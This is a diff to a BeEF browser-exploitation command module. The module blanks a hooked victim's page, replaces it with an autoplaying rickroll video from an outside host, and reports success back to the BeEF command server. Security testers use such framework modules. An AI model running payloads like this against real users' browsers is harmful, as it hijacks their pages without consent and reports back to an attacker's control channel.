@@ -5,11 +5,11 @@
 //
 
 beef.execute(function() {
-	$j('body').html('');
+        $j('body').html('');
 
-	$j('body').css({'padding':'0px', 'margin':'0px', 'height':'100%'});
-	$j('html').css({'padding':'0px', 'margin':'0px', 'height':'100%'});
+        $j('body').css({'padding':'0px', 'margin':'0px', 'height':'100%'});
+        $j('html').css({'padding':'0px', 'margin':'0px', 'height':'100%'});
 
-        $j('body').html('<iframe width="100%" height="100%" src="//www.youtube.com/embed/DLzxrzFCyOs?autoplay=1" allow="autoplay; encrypted-media" frameborder="0" allowfullscreen></iframe>');
-	beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Rickroll Successful");
+        $j('body').html('<video width="100%" height="100%" autoplay><source src="https://rickroll.switchalpha.dev/rickroll.mp4" type="video/mp4"></video>');
+        beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Rickroll Successful");
 });
